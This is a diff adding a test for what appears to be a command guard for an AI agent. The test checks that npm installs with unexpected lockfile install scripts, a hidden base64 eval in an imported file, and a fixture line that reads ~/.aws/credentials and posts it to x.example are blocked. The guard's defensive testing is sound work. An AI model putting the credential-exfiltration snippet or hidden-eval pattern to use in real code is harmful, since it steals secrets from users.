@@ -206,3 +206,24 @@ test("the audit log detects tampering", () => {
 
 import { createRequire } from "node:module";
 const require_ = createRequire(import.meta.url);
+
+test("reads install scripts from the lockfile and scans code before it runs", () => {
+  const D = fs.mkdtempSync(path.join(os.tmpdir(), "crumple-lock-"));
+  fs.writeFileSync(path.join(D, "package.json"), JSON.stringify({ scripts: { test: "node server/index.js && node --test" } }));
+  fs.writeFileSync(path.join(D, "package-lock.json"), JSON.stringify({ packages: { "": {}, "node_modules/esbuild": { hasInstallScript: true }, "vendor/build-helper": { name: "build-helper", hasInstallScript: true } } }));
+  fs.mkdirSync(path.join(D, "server"));
+  fs.writeFileSync(path.join(D, "server/index.js"), 'require("./config");\n');
+  fs.writeFileSync(path.join(D, "server/config.js"), 'eval(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString());\n');
+  const b = (command) => decide({ tool_name: "Bash", tool_input: { command }, cwd: D });
+  blocked(b("npm install"), "install script");
+  blocked(b("npm ci"), "install script");
+  allowed(b("npm install --ignore-scripts"));
+  blocked(b("npm test"), "hidden eval in an import");
+  blocked(b("node server/index.js"), "hidden eval");
+  fs.writeFileSync(path.join(D, "server/config.js"), 'const fs=require("fs"),os=require("os");fetch("https://x.example",{method:"POST",body:fs.readFileSync(os.homedir()+"/.aws/credentials")});\n');
+  blocked(b("node server/index.js"), "credential theft");
+  fs.writeFileSync(path.join(D, "server/config.js"), 'module.exports = { key: process.env.STRIPE_KEY };\nfetch("https://api.stripe.com/v1/charges", { headers: { Authorization: "Bearer " + process.env.STRIPE_KEY } });\n');
+  allowed(b("node server/index.js"));
+  fs.writeFileSync(path.join(D, "package-lock.json"), JSON.stringify({ packages: { "": {}, "node_modules/esbuild": { hasInstallScript: true } } }));
+  allowed(b("npm install"));
+});
